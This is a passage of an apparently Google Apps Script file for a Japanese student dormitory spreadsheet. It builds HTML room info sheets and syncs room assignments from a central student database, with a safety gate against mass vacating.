// Build the full HTML for one room's dorm info sheet (no PDF conversion).
// Separated so bulk export can accumulate many rooms' HTML and convert once.
//
// A thin wrapper so the _renderingRoomHtml window is opened and closed in ONE
// place — the body below has several early exits, and a flag left set by one of
// them would leave _getDriveImageBase64_ callable for the rest of the execution.
// The previous value is restored rather than cleared, so a future nested call
// can't close the window early for its caller.
function _buildRoomHtml_(roomData, bldgData) {
  const was = _renderingRoomHtml;
  _renderingRoomHtml = true;
  try { return _buildRoomHtmlInner_(roomData, bldgData); }
  finally { _renderingRoomHtml = was; }
}

function _buildRoomHtmlInner_(roomData, bldgData) {
  let htmlString = HtmlService.createHtmlOutputFromFile('Template').getContent();
  
  const replaceTag = (tag, value) => { 
    let safeValue = value || "";
    if (typeof safeValue === 'string') {
      // Trim leading/trailing newlines so an EN-only ("text\n") or JP-only
      // ("\ntext") combined value doesn't render an empty line in the PDF.
      safeValue = safeValue.replace(/^\n+/, '').replace(/\n+$/, '').replace(/\n/g, '<br>');
    }
    htmlString = htmlString.replace(new RegExp("{{" + tag + "}}", "g"), safeValue); 
  };

  // Format rent with thousands separators for display (e.g. 45000 -> 45,000).
  const formatRent = (v) => {
    let s = String(v == null ? "" : v).replace(/,/g, "").trim();
    if (s === "" || isNaN(Number(s))) return s; // leave non-numeric as-is
    return Number(s).toLocaleString("en-US");
  };

  // Rent: room value overrides the building default (same replace semantics as
  // the utility bills). Room rent blank → inherit the building's 家賃.
  let _rNorm = v => String(v == null ? "" : v).replace(/,/g, "").trim();
  let effectiveRent = _rNorm(roomData.rentPrice) !== "" ? roomData.rentPrice : bldgData.rentDefault;
  replaceTag("Room_Number", roomData.roomNumber); replaceTag("Rent_Price", formatRent(effectiveRent));
  replaceTag("Mailbox_Code", roomData.mailboxCode); replaceTag("Delivery_Box_Code", roomData.deliveryBoxCode);
  replaceTag("Wifi_Info", roomData.wifiInfo); replaceTag("Bicycle_Number", roomData.bicycleNumber);
  replaceTag("Room_Code", roomData.roomCode || "");
  
  replaceTag("Auto_Lock", bldgData.autoLock);
  replaceTag("Remarks", bldgData.remarks); 
  replaceTag("Building_Name_EN", bldgData.bldgNameEn); 
  replaceTag("Building_Name_JP", bldgData.bldgNameJp); 
  replaceTag("Address_EN", bldgData.addressEn);
  replaceTag("Address_JP", bldgData.addressJp); 
  // Trash bag values are stored as "JP / EN"; show them on two lines in the PDF
  // (display only — the stored value keeps the slash).
  // Upgrade old short bag values ("...黄色) / Yellow") to the new full English,
  // then convert the " / " separator to a line break for the PDF.
  const upgradeBag = (v) => {
    let s = String(v || "");
    if (s.indexOf("(黄色) / Yellow") !== -1 && s.indexOf("designated") === -1)
      s = "市指定ゴミ袋(黄色) / City designated Yellow bag";
    else if (s.indexOf("(透明色) / Clear") !== -1 && s.indexOf("designated") === -1)
      s = "市指定ゴミ袋(透明色) / City designated Clear bag";
    return s;
  };
  const bagToLines = (v) => upgradeBag(v).replace(/\s*\/\s*/g, '\n');
  replaceTag("Garbage_Household_Date", bldgData.garbageHousehold); replaceTag("Garbage_Household_Bag", bagToLines(bldgData.garbageHouseholdBag));
  replaceTag("Garbage_BurnablePlastic_Date", bldgData.garbageBurnablePlastic); replaceTag("Garbage_BurnablePlastic_Bag", bagToLines(bldgData.garbageBurnablePlasticBag));
  replaceTag("Garbage_Can_Date", bldgData.garbageCans); replaceTag("Garbage_Can_Bag", bagToLines(bldgData.garbageCansBag));
  replaceTag("Garbage_Plastic_Date", bldgData.garbagePlastic); replaceTag("Garbage_Plastic_Bag", bagToLines(bldgData.garbagePlasticBag));
  replaceTag("Garbage_Paper_Date", bldgData.garbagePaper); replaceTag("Garbage_Paper_Bag", bagToLines(bldgData.garbagePaperBag));
  
  replaceTag("Date", new Date().toLocaleDateString('ja-JP'));
  replaceTag("Garbage_Place_Info", bldgData.garbagePlaceInfo); replaceTag("Furigana", ""); 

  // --- Utility bill rows (group by shared method/value) ---
  // Utilities whose value matches (whitespace-insensitive) are combined into one
  // row, e.g. "電気・ガス・水道 / Electricity, Gas, Water: 家賃に込み". Utilities with
  // a unique value get their own row. Groups appear in first-appearance order.
  (function() {
    const cleanVal = (v) => {
      let s = (v || "").trim();
      return (s.toLowerCase() === "undefined" || s.toLowerCase() === "null") ? "" : s;
    };
    // Per-room override: if the room has a value for a bill type, it REPLACES the
    // building value for that bill on this room's PDF. Blank override = inherit
    // the building default (normal behavior).
    const pick = (override, bldgVal) => {
      let o = cleanVal(override);
      return o !== "" ? o : cleanVal(bldgVal);
    };
    const utils = [
      { jp: "水道", en: "Water", val: pick(roomData.waterBillOverride, bldgData.waterBill) },
      { jp: "給湯", en: "Hot Water", val: pick(roomData.hotWaterBillOverride, bldgData.hotWaterBill) },
      { jp: "電気", en: "Electricity", val: pick(roomData.elecBillOverride, bldgData.elecBill) },
      { jp: "ガス", en: "Gas", val: pick(roomData.gasBillOverride, bldgData.gasBill) },
      { jp: "インターネット", en: "Internet", val: pick(roomData.internetBillOverride, bldgData.internetBill) },
      { jp: "その他", en: "Other", val: pick(roomData.otherBillOverride, bldgData.otherBill) }
    ];
    const present = utils.filter(u => u.val !== "");
    const norm = s => s.replace(/\s+/g, "").toLowerCase();

    // Group by normalized value, preserving first-appearance order.
    const groups = [];
    const indexByKey = {};
    present.forEach(u => {
      const key = norm(u.val);
      if (indexByKey[key] === undefined) {
        indexByKey[key] = groups.length;
        groups.push({ items: [u], val: u.val });
      } else {
        groups[indexByKey[key]].items.push(u);
      }
    });

    const esc = s => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    const valToHtml = v => esc(v).replace(/\n/g, "<br>");

    let rowsHtml = "";
    groups.forEach(g => {
      const jpLabel = g.items.map(i => i.jp).join("・");
      const enLabel = g.items.map(i => i.en).join(", ");
      const label = jpLabel + " / " + enLabel;
      rowsHtml += '<tr><td class="info-label">' + esc(label) + ':</td><td class="bold">' + valToHtml(g.val) + '</td></tr>';
    });

    htmlString = htmlString.replace(/\{\{Utility_Rows\}\}/g, rowsHtml);
  })();
  
  replaceTag("DISPLAY_Exterior", bldgData.exteriorId ? "" : "display: none;"); 
  replaceTag("DISPLAY_Route_1", bldgData.routeUrl1 ? "" : "display: none;"); 
  replaceTag("DISPLAY_Route_2", bldgData.routeUrl2 ? "" : "display: none;"); 
  replaceTag("DISPLAY_Header_Images", (bldgData.exteriorId || bldgData.routeUrl1 || bldgData.routeUrl2) ? "" : "display: none;"); 

  replaceTag("DISPLAY_Mailbox", roomData.mailboxCode ? "" : "display: none;");
  replaceTag("DISPLAY_DeliveryBox", roomData.deliveryBoxCode ? "" : "display: none;");
  replaceTag("DISPLAY_Wifi", roomData.wifiInfo ? "" : "display: none;");
  replaceTag("DISPLAY_RoomCode", (roomData.roomCode && String(roomData.roomCode).trim()) ? "" : "display: none;");
  replaceTag("DISPLAY_Bicycle_Number", roomData.bicycleNumber ? "" : "display: none;");
  
  replaceTag("DISPLAY_AutoLock", bldgData.autoLock ? "" : "display: none;");
  replaceTag("DISPLAY_Remarks", bldgData.remarks ? "" : "display: none;");

  replaceTag("DISPLAY_Garbage_Household", bldgData.garbageHousehold ? "" : "display: none;");
  replaceTag("DISPLAY_Garbage_BurnablePlastic", bldgData.garbageBurnablePlastic ? "" : "display: none;");
  replaceTag("DISPLAY_Garbage_Can", bldgData.garbageCans ? "" : "display: none;"); 
  replaceTag("DISPLAY_Garbage_Plastic", bldgData.garbagePlastic ? "" : "display: none;"); 
  replaceTag("DISPLAY_Garbage_Paper", bldgData.garbagePaper ? "" : "display: none;"); 

  replaceTag("DISPLAY_Garbage_Place_Info", bldgData.garbagePlaceInfo ? "" : "display: none;");

  replaceTag("DISPLAY_CAPTION_Exterior", bldgData.exteriorCaption ? "" : "display: none;"); replaceTag("Caption_Exterior", bldgData.exteriorCaption);

  replaceTag("QR_Route_1", _getQrBase64_(bldgData.routeUrl1));
  replaceTag("QR_Route_2", _getQrBase64_(bldgData.routeUrl2));
  replaceTag("QR_Hazard_Map", _getQrBase64_("https://www.bousai.city.kyoto.lg.jp/bousai/hazardmap/index.html?lay=saigai_34")); 

  replaceTag("Image_Exterior", _getDriveImageBase64_(bldgData.exteriorId));

  // --- Facility photos: flowing layout ---
  // Each photo is a self-contained card (category title + image + caption).
  // Cards are inline-block so they flow left-to-right and wrap to a new line
  // when they run out of horizontal space (flexbox isn't supported by the
  // GAS PDF renderer, so inline-block is the reliable wrapping mechanism).
  (function() {
    const escHtml = s => String(s == null ? "" : s)
      .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    const capHtml = s => escHtml(s).replace(/\n/g, "<br>");

    const photos = [
      { title: "ゴミ捨て場所 / Garbage", id: bldgData.garbage1Id, cap: bldgData.garbage1Caption },
      { title: "ゴミ捨て場所 / Garbage", id: bldgData.garbage2Id, cap: bldgData.garbage2Caption },
      { title: "ゴミ捨て場所 / Garbage", id: bldgData.garbage3Id, cap: bldgData.garbage3Caption },
      { title: "洗濯機 / Washing Machine", id: bldgData.wm1Id, cap: bldgData.wm1Caption },
      { title: "洗濯機 / Washing Machine", id: bldgData.wm2Id, cap: bldgData.wm2Caption },
      { title: "洗濯機 / Washing Machine", id: bldgData.wm3Id, cap: bldgData.wm3Caption },
      { title: "駐輪場 / Bicycle Parking", id: bldgData.bicycle1Id, cap: bldgData.bicycle1Caption },
      { title: "駐輪場 / Bicycle Parking", id: bldgData.bicycle2Id, cap: bldgData.bicycle2Caption },
      { title: "駐輪場 / Bicycle Parking", id: bldgData.bicycle3Id, cap: bldgData.bicycle3Caption }
    ];

    // Collect only the photos that actually have an image.
    const present = photos.filter(p => p.id);

    const PER_ROW = 3;
    const totalCount = present.length;
    const totalRows = Math.ceil(totalCount / PER_ROW);

    // Image height scales with how many ROWS of photos there are, so the whole
    // gallery stays on one page: fewer photos -> taller images, more -> shorter.
    let baseHeight;
    if (totalRows <= 1) baseHeight = 230;       // 1-3 photos: large
    else if (totalRows === 2) baseHeight = 145; // 4-6 photos: medium
    else baseHeight = 88;                        // 7-9 photos: compact

    // Width by how many cards share a row, so a 1- or 2-card row spreads out
    // (fewer photos render wider) instead of crowding one side.
    const widthByRowCount = { 1: 60, 2: 48, 3: 31 };

    let cardsHtml = "";
    for (let i = 0; i < present.length; i += PER_ROW) {
      const rowItems = present.slice(i, i + PER_ROW);
      const inRow = rowItems.length;
      const w = widthByRowCount[inRow] || 31;
      const h = baseHeight;
      // Each row is its own centered block so 1- or 2-card rows sit centered
      // with even spacing rather than crowding the left edge.
      let rowHtml = '<div style="text-align: center; margin-top: 4px;">';
      rowItems.forEach(p => {
        const captionHtml = p.cap
          ? '<div style="font-size: 9px; color: #555; margin-top: 1px;">' + capHtml(p.cap) + '</div>'
          : '';
        rowHtml +=
          '<div style="display: inline-block; vertical-align: top; width: ' + w + '%; margin: 0 1%; box-sizing: border-box; text-align: center;">' +
            '<div class="bold" style="font-size: 10px; margin-bottom: 1px;">' + escHtml(p.title) + '</div>' +
            '<img src="' + _getDriveImageBase64_(p.id) + '" style="width: 100%; height: ' + h + 'px; object-fit: contain;" alt="' + escHtml(p.title) + '"/>' +
            captionHtml +
          '</div>';
      });
      rowHtml += '</div>';
      cardsHtml += rowHtml;
    }

    // Garbage place-info content, shown once below the gallery if present.
    // (No label — the photo card above already shows the ゴミ捨て場所 title.)
    let placeInfoHtml = "";
    if (bldgData.garbagePlaceInfo) {
      placeInfoHtml = '<div style="font-size: 10px; margin-top: 3px; text-align: left;">'
        + capHtml(bldgData.garbagePlaceInfo) + '</div>';
    }

    htmlString = htmlString.replace(/\{\{Photo_Cards\}\}/g, cardsHtml);
    htmlString = htmlString.replace(/\{\{Garbage_Place_Info_Line\}\}/g, placeInfoHtml);
  })();

  return htmlString;
}

// --- 6. AUTO-FILL ENGINE ---
function syncDormsFromCentralDB(userRole, userPerms, actorName, actorId) {
  // ONE SCOPE, DECIDED PER ROOM. There is no mode argument any more:
  //
  //   vacant   + a Central_DB match  -> assign
  //   occupied + a Central_DB match  -> refresh from Central_DB
  //   occupied + NO match            -> vacate, and record it
  //
  // It used to ask 空室のみ / 全部屋を上書き in a modal first, which was a global
  // wrapper over a decision this loop already makes room by room.
  //
  // ⚠️ That third row is destructive, and "no match" is ambiguous — the student
  // moved out, OR their 寮 string does not resolve to this building (an alias
  // gap). Both look identical here. It vacates because that is what the operation
  // is for; Room_Info is snapshotted before the write, and _syncGate below is what
  // keeps a whole-dorm wipe from being one of the things it can do unattended.
  if (!_hasPerm_(userRole, userPerms, "edit_dorms")) throw new Error("権限がありません");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const dbSheet = ss.getSheetByName("Central_DB");
  const bldgSheet = ss.getSheetByName(SHEET_BUILDING);
  const roomSheet = ss.getSheetByName(SHEET_ROOM);

  if (!dbSheet || !bldgSheet || !roomSheet) throw new Error("寮の更新に必要なデータが見つかりません。（DORM-06）");

  const dbData = dbSheet.getDataRange().getDisplayValues();
  const bldgData = bldgSheet.getDataRange().getDisplayValues();
  const roomData = roomSheet.getDataRange().getValues(); 

  // ⚠️ Records before returning. This path left NO trace anywhere — from the nightly
  // trigger it was indistinguishable from a clean run, which is the whole reason the
  // report exists.
  if (dbData.length < 2 || roomData.length < 2) {
    _saveDormSyncReport_({
      updated: 0, occupiedUpdated: 0, vacated: 0, gate: "", held: 0, rooms: [],
      error: "寮の更新に必要なデータが空です。（DORM-01）"
    });
    return "同期するデータがありません。";
  }

  const normalize = (str) => {
    if (!str) return "";
    return String(str)
      .replace(/[Ａ-Ｚａ-ｚ０-９]/g, s => String.fromCharCode(s.charCodeAt(0) - 0xFEE0))
      .toLowerCase()
      .replace(/[\s　_\-＆&]/g, '')
      .replace(/号室|室|号/g, ''); 
  };

  let bldgMap = {};
  for (let i = 1; i < bldgData.length; i++) {
    let bId = String(bldgData[i][0]).trim();
    if (bId) {
      let bNameJp = String(bldgData[i][2] || bldgData[i][1]).trim();
      bldgMap[bId] = {
        idNorm: normalize(bId),
        jpNorm: normalize(bNameJp),
        rawJp: bNameJp || bId
      };
    }
  }

  // --- Alias table (Dorm_Aliases): explicit "student-written name → building ID"
  // mappings. Tried FIRST; the fuzzy matcher is the fallback for unmapped names.
  // Auto-created with headers + examples on first run so the format is visible.
  let aliasSheet = ss.getSheetByName("Dorm_Aliases");
  if (!aliasSheet) {
    aliasSheet = ss.insertSheet("Dorm_Aliases");
    aliasSheet.appendRow(["学生表記 (Student-written name)", "建物ID (Building ID)", "備考 (Note)"]);
    // Example rows (safe to edit/delete). The first column is the text students
    // write before the room number; the second is the exact Building_Info ID.
    aliasSheet.appendRow(["アルカデア", "（ここに建物IDを入力）", "例: アルカデア413 → アルカデア西京極"]);
    aliasSheet.appendRow(["アーバンⅡ", "（ここに建物IDを入力）", "例: アーバンⅡ402 → アーバンハウスA&U Ⅱ"]);
    aliasSheet.getRange(1, 1, 1, 3).setFontWeight("bold");
  }

  // Load aliases. Each entry: { aliasNorm, aliasLen, bId }. Sorted longest-first
  // so "アーバンⅡ" wins over "アーバン" for "アーバンⅡ402".
  let aliases = [];
  try {
    const aData = aliasSheet.getDataRange().getDisplayValues();
    for (let i = 1; i < aData.length; i++) {
      let written = String(aData[i][0] || "").trim();
      let bId = String(aData[i][1] || "").trim();
      // Skip blank rows and the unfilled example placeholder.
      if (!written || !bId || bId.indexOf("ここに建物ID") !== -1) continue;
      // Only keep aliases pointing to a real building.
      if (!bldgMap[bId]) continue;
      let an = normalize(written);
      if (an) aliases.push({ aliasNorm: an, aliasLen: an.length, bId: bId });
    }
    aliases.sort(function(a, b){ return b.aliasLen - a.aliasLen; }); // longest first
  } catch (e) { /* alias table optional */ }

  // Resolve a student's dorm string to a building ID via the alias table.
  // Returns { bId, roomPart } if an alias matches the start, else null.
  function resolveAlias(dormNorm) {
    for (let k = 0; k < aliases.length; k++) {
      let a = aliases[k];
      if (dormNorm.indexOf(a.aliasNorm) === 0) {
        return { bId: a.bId, roomPart: dormNorm.slice(a.aliasNorm.length) };
      }
    }
    return null;
  }

  const headers = dbData[0];

  // Fuzzy header lookup (restores pre-optimization behavior): normalize width,
  // spaces, and punctuation, then match exact-first, then by containment.
  const normHeader = (s) => String(s == null ? "" : s)
    .replace(/[Ａ-Ｚａ-ｚ０-９]/g, ch => String.fromCharCode(ch.charCodeAt(0) - 0xFEE0))
    .replace(/[\s　_\-]/g, '')
    .toLowerCase();
  const findHeader = (...candidates) => {
    const normCands = candidates.map(normHeader);
    // exact match first
    for (let c = 0; c < headers.length; c++) {
      const h = normHeader(headers[c]);
      if (h && normCands.indexOf(h) !== -1) return c;
    }
    // containment fallback
    for (let c = 0; c < headers.length; c++) {
      const h = normHeader(headers[c]);
      if (!h) continue;
      if (normCands.some(nc => nc && (h.includes(nc) || nc.includes(h)))) return c;
    }
    return -1;
  };

  const dormIdx = findHeader("寮");
  const idIdx = findHeader("学籍番号");
  const nameEnIdx = findHeader("名前英語");
  const yomiIdx = findHeader("読み方");
  const natIdx = findHeader("国名", "国籍");
  const clsIdx = findHeader("クラス");

  let studentsInDorms = [];
  for (let i = 1; i < dbData.length; i++) {
    let rawDorm = dormIdx === -1 ? "" : String(dbData[i][dormIdx]).trim();
    if (rawDorm && rawDorm !== "-" && rawDorm !== "") {
       let nameVal = "";
       if (nameEnIdx !== -1 && String(dbData[i][nameEnIdx]).trim()) nameVal = String(dbData[i][nameEnIdx]).trim();
       else if (yomiIdx !== -1 && String(dbData[i][yomiIdx]).trim()) nameVal = String(dbData[i][yomiIdx]).trim();
       else nameVal = "未設定";
       // Shared-room slot suffix: "広田201-2" means room 201, bed/slot 2. The
       // hyphen is stripped by normalize(), so detect it on the RAW string and
       // keep a suffix-removed variant for a retry match. Single digit 1-9 only,
       // so real room numbers like "201-12" or "2F-1" are not misread as slots.
       let slotM = String(rawDorm).match(/^(.*\S)[\-－‐−]\s*([1-9右左])\s*$/);
       let slotVal = slotM ? (slotM[2] === '左' ? 1 : (slotM[2] === '右' ? 2 : parseInt(slotM[2], 10))) : null;
       studentsInDorms.push({
         id: idIdx === -1 ? "" : String(dbData[i][idIdx]).trim(),
         name: nameVal,
         nat: natIdx === -1 ? "" : String(dbData[i][natIdx]).trim(),
         cls: clsIdx === -1 ? "" : String(dbData[i][clsIdx]).trim(),
         rawDorm: rawDorm,
         dormNorm: normalize(rawDorm),
         slot: slotVal,
         dormNormNoSlot: slotM ? normalize(slotM[1]) : null,
         alias: resolveAlias(normalize(rawDorm)) // {bId, roomPart} or null
       });
    }
  }

  let updateCount = 0;
  let occupiedUpdated = 0;
  let vacatedCount = 0;
  let unmatchedOccupied = [];
  let pendingVacate = [];
  let debugLog = [];

  // ---- THE SANITY GATE -------------------------------------------------------
  //
  // ⚠️ Verified failure mode: rename Central_DB's 寮 header and dormIdx becomes -1,
  // so studentsInDorms is empty, so EVERY occupied room matches nothing and is
  // vacated. The diagnostic path at the bottom that would have caught this only
  // runs when updateCount === 0 — and the vacates make updateCount large, so the
  // function empties the dorms and returns 「成功！」.
  //
  // That was survivable while a human had to choose 全部屋を上書き, click through a
  // confirm, and had 割当テスト sitting next to the button. Running nightly and
  // unattended, it is a silent wipe.
  //
  // So: when the shape of the input says "no student has a dorm" rather than "these
  // students moved out", do the ASSIGNMENTS and skip every vacate. Real move-outs
  // still vacate automatically — this only refuses the whole-dorm case, which is
  // never what a move-out looks like.
  const occupiedTotal = (function () {
    let n = 0;
    for (let r = 1; r < roomData.length; r++) {
      if (!String(roomData[r][1] || "").trim()) continue;
      const st = String(roomData[r][7] || "").trim();
      if (!(st === "空室" || String(roomData[r][9] || "").trim() === "")) n++;
    }
    return n;
  })();
  // ⚠️ The floor matters as much as the ratio: without it a building with 4 occupied
  // rooms could never register 2 genuine move-outs in one run.
  const vacateCap = Math.max(DORM_VACATE_MIN, Math.floor(occupiedTotal * DORM_VACATE_MAX_RATIO));
  let gateReason = "";
  if (dormIdx === -1) gateReason = "学生データに「寮」の項目が見つかりません（DORM-02）";
  else if (idIdx === -1) gateReason = "学生データに「学籍番号」の項目が見つかりません（DORM-03）";
  else if (studentsInDorms.length === 0) gateReason = "寮の記入がある学生が 0 名です";
  // The count-based arm cannot be decided here — it needs the loop's result — so it
  // is applied to the collected vacates below, after matching, and sets gateReason
  // then. Both arms end in the same place: assignments kept, vacates dropped.

  function getBuildingIndex(name) {
    let match = name.match(/(iii|ii|i|3|2|1|ⅲ|ⅱ|ⅰ)$/i);
    if (match) {
      let val = match[1].toLowerCase();
      if (val === 'iii' || val === '3' || val === 'ⅲ') return 3;
      if (val === 'ii' || val === '2' || val === 'ⅱ') return 2;
      if (val === 'i' || val === '1' || val === 'ⅰ') return 1;
    }
    return null;
  }

  for (let r = 1; r < roomData.length; r++) {
    let bId = String(roomData[r][1] || "").trim();
    let roomNum = String(roomData[r][2] || "").trim();
    let status = String(roomData[r][7] || "").trim();
    let currentStudentId = String(roomData[r][9] || "").trim();

    if (!bId) continue; 

    let isVacant = (status === "空室" || currentStudentId === "");
    {
       let bInfo = bldgMap[bId] || { idNorm: normalize(bId), jpNorm: normalize(bId), rawJp: bId };
       if (!roomNum) continue;
       
       let roomNorm = normalize(roomNum);

       let matchedStudents = studentsInDorms.filter(s => {
          // --- PASS 1: alias table (explicit, reliable). If this student's dorm
          // string resolved to a building via an alias, match strictly on that
          // building ID + room number. Skip the fuzzy logic entirely.
          if (s.alias) {
             if (s.alias.bId !== bId) return false;             // alias points elsewhere
             // The room portion (after the alias) must contain this room number.
             return s.alias.roomPart.includes(roomNorm) && roomNorm.length > 0;
          }

          // --- PASS 2 (fallback): original fuzzy matcher for unmapped names.
          let bNames = [bInfo.idNorm, bInfo.jpNorm].filter(n => n.length > 0);
          let bldgMatchFor = function(sNameOnly) {
            return bNames.some(bName => {
             let bIdx = getBuildingIndex(bName);
             let sIdx = getBuildingIndex(sNameOnly);

             let effBIdx = (bIdx === null) ? 1 : bIdx;
             let effSIdx = (sIdx === null) ? 1 : sIdx;

             if (effBIdx !== effSIdx) return false; 

             let bBase = bName.replace(/(iii|ii|i|3|2|1|ⅲ|ⅱ|ⅰ)$/i, '');
             let sBase = sNameOnly.replace(/(iii|ii|i|3|2|1|ⅲ|ⅱ|ⅰ)$/i, '');

             if (bBase.length === 0 || sBase.length === 0) return true;

             let cleanB = bBase.replace(/ハウス|ハイツ|アパート|マンション/g, '');
             let cleanS = sBase.replace(/ハウス|ハイツ|アパート|マンション/g, '');

             if (cleanB.length === 0 || cleanS.length === 0) return true;

             // Match only by containment. (A previous 3-character-prefix rule caused
             // false matches between buildings sharing a common prefix, e.g.
             // グリーンヴィラ小田 wrongly matching グリーンマークス, or アメニティー1番館
             // matching アメニティー2番. Containment is safe: "アルカデア" ⊂ "アルカデア西京極"
             // still matches, but distinct names with a shared prefix do not.)
             if (cleanB.includes(cleanS) || cleanS.includes(cleanB)) return true;

             return false;
            });
          };

          let isBldgMatch = false;
          if (s.dormNorm.includes(roomNorm)) {
            isBldgMatch = bldgMatchFor(s.dormNorm.replace(roomNorm, ''));
          }
          // Shared-room retry: "広田201-2" leaves a residue "広田2" whose trailing
          // slot digit the building-index logic misreads as "building 2" and
          // rejects. Retry with the suffix removed. Because normalize() strips
          // both hyphens and spaces, ALL separator variants — "201-2", "201 2",
          // and spaceless "2012" — leave the same residue, so the retry is done
          // room-relatively on the residue rather than by parsing a separator.
          // Guard: the char before the stripped digit must be a non-digit, so
          // "広田20112" (room 2011, slot 2) can't falsely match room 201.
          if (!isBldgMatch && s.dormNormNoSlot && s.dormNormNoSlot.includes(roomNorm)) {
            isBldgMatch = bldgMatchFor(s.dormNormNoSlot.replace(roomNorm, ''));
          }
          if (!isBldgMatch && s.dormNorm.includes(roomNorm)) {
            let residue = s.dormNorm.replace(roomNorm, '');
            let dm = residue.match(/^(.*[^0-9])([1-9右左])$/);
            if (dm && bldgMatchFor(dm[1])) {
              isBldgMatch = true;
              // 左/右 bed labels order as 1/2; digits as themselves.
              s._slotForRoom = (dm[2] === '左' ? 1 : (dm[2] === '右' ? 2 : parseInt(dm[2], 10)));
            }
          }

          if (!isBldgMatch) {
             debugLog.push(`'${s.rawDorm}' failed check for [${bInfo.rawJp}] (Room ${roomNum})`);
          }
          return isBldgMatch;
       });

       if (matchedStudents.length > 0) {
          // Shared rooms: stack tenants in slot order (201-1 above 201-2).
          // _slotForRoom is set when the slot was detected room-relatively
          // (space/spaceless variants); s.slot when a "-N" suffix was on the raw.
          matchedStudents.sort(function(a, b){
            let sa = (a._slotForRoom != null) ? a._slotForRoom : (a.slot != null ? a.slot : 0);
            let sb = (b._slotForRoom != null) ? b._slotForRoom : (b.slot != null ? b.slot : 0);
            return sa - sb;
          });
          roomData[r][7] = "入居中"; 
          roomData[r][9] = matchedStudents.map(s => s.id).join('\n');
          roomData[r][10] = matchedStudents.map(s => s.name).join('\n');
          roomData[r][11] = matchedStudents.map(s => s.nat).join('\n');
          roomData[r][12] = matchedStudents.map(s => s.cls).join('\n');
          
          matchedStudents.forEach(ms => {
            let idx = studentsInDorms.findIndex(s => s.id === ms.id);
            if (idx !== -1) studentsInDorms.splice(idx, 1);
          });
          updateCount++;
          if (!isVacant) occupiedUpdated++;
       } else if (!isVacant) {
          // Occupied room with no Central_DB match → a candidate for vacating.
          //
          // ⚠️ COLLECTED, NOT WRITTEN. The gate below decides whether these are
          // applied, and it can only decide once the whole sheet has been matched —
          // "30% of the dorms just emptied" is not visible one room at a time.
          // Writing here and undoing later would mean the assignments and the
          // vacates could not be kept and dropped independently, which is the
          // entire point of the gate.
          let curNames = String(roomData[r][10] || "").replace(/\n/g, "・");
          pendingVacate.push({
            row: r,
            label: bInfo.rawJp + " " + roomNum + (curNames ? "（現在: " + curNames + "）" : "")
          });
       }
    }
  }

  // ---- gate arm 2: the blast radius, knowable only now ----
  // ⚠️ Ordered after the input-shape arms so the more specific reason wins: a
  // missing 寮 header explains the count, and reporting the count instead would
  // send someone hunting for move-outs that never happened.
  if (!gateReason && pendingVacate.length > vacateCap) {
    gateReason = "空室にする部屋が多すぎます（" + pendingVacate.length + "室 / 上限 " +
                 vacateCap + "室）（DORM-04）";
  }

  if (!gateReason) {
    pendingVacate.forEach(function (pv) {
      unmatchedOccupied.push(pv.label);
      roomData[pv.row][7]  = "空室";
      roomData[pv.row][9]  = "";   // studentId
      roomData[pv.row][10] = "";   // studentName
      roomData[pv.row][11] = "";   // nationality
      roomData[pv.row][12] = "";   // class
      updateCount++;
      vacatedCount++;
    });
  }

  if (updateCount > 0) {
    _snapshotSheet_(SHEET_ROOM); // back up before bulk auto-assign write
    // Apply text formats BEFORE writing so leading-zero fields aren't coerced,
    // then write, then re-apply (belt and suspenders — the bulk setValues can
    // otherwise turn "0123" WiFi/codes into the number 123).
    _applyRoomInfoFormats_(roomSheet);
    roomSheet.getRange(1, 1, roomData.length, roomData[0].length).setValues(roomData);
    _applyRoomInfoFormats_(roomSheet);
    _logActivity_({ role: userRole, name: actorName || "", id: actorId || "" },
                 "寮の自動割当", SHEET_ROOM,
                 updateCount + "部屋" + (vacatedCount ? "（空室化 " + vacatedCount + "）" : "") +
                 (gateReason ? "（空室化は保留: " + gateReason + "）" : ""));
    let msg = `成功！ ${updateCount} 部屋を更新しました。`;
    msg += `（入居中の部屋の更新: ${occupiedUpdated}件 / 空室化: ${vacatedCount}件）`;
    if (gateReason) msg += _dormGateMessage_(gateReason, pendingVacate.length);
    if (unmatchedOccupied.length > 0) {
      msg += `\n\n⚠️ 一致する学生がいなかったため空室にした部屋: ${unmatchedOccupied.length}件\n`;
      msg += unmatchedOccupied.slice(0, 15).map(s => "・" + s).join("\n");
      if (unmatchedOccupied.length > 15) msg += `\n…ほか ${unmatchedOccupied.length - 15} 件`;
      msg += "\n\n退去済みであれば問題ありません。"
           + "入居中のはずの部屋が空室になっている場合は、管理者にご連絡ください。";
    }
    _saveDormSyncReport_({
      updated: updateCount, occupiedUpdated: occupiedUpdated, vacated: vacatedCount,
      gate: gateReason, held: gateReason ? pendingVacate.length : 0,
      rooms: gateReason ? pendingVacate.map(function (pv) { return pv.label; }) : unmatchedOccupied
    });
    return msg;
  } else {
    // ⚠️ Reached with the gate armed whenever the input shape was wrong: nothing
    // matched, so nothing was assigned, AND the vacates were held. Both halves have
    // to be reported or the panel stays silent on the run that most needs it.
    _saveDormSyncReport_({
      updated: 0, occupiedUpdated: 0, vacated: 0,
      gate: gateReason || "一致するデータがありません",
      held: pendingVacate.length,
      rooms: pendingVacate.map(function (pv) { return pv.label; })
    });
    let errorMsg = "マッチするデータが見つかりませんでした。\n\n";
    if (gateReason) errorMsg = "⚠️ " + gateReason + "。\n\n" +
      "この状態では入居中の部屋を空室化しません（対象だった " + pendingVacate.length + " 室はそのままです）。\n\n";
    // Surface header-detection problems explicitly (common cause of silent failure)
    let missing = [];
    if (dormIdx === -1) missing.push("寮");
    if (idIdx === -1) missing.push("学籍番号");
    if (missing.length > 0) {
      errorMsg += "【注意】学生データに次の項目が見つかりませんでした: " + missing.join(", ") + "\n";
      errorMsg += "ヘッダー名を確認してください。\n\n";
    }
    if (studentsInDorms.length === 0 && dormIdx !== -1) {
      errorMsg += "寮の記入がある学生が見つかりませんでした。\n\n";
    } else {
      errorMsg += `寮の記入がある学生数: ${studentsInDorms.length} 名\n\n`;
      // For each building, check whether its name even appears in any student's dorm field.
      // This distinguishes "no tenant exists" from "name/room spelling differs".
      let presenceLines = [];
      Object.keys(bldgMap).forEach(bId => {
        let bInfo = bldgMap[bId];
        let key = bInfo.jpNorm || bInfo.idNorm;
        if (!key) return;
        // strip a trailing area/suffix down to a stem of >=2 chars for a loose presence test
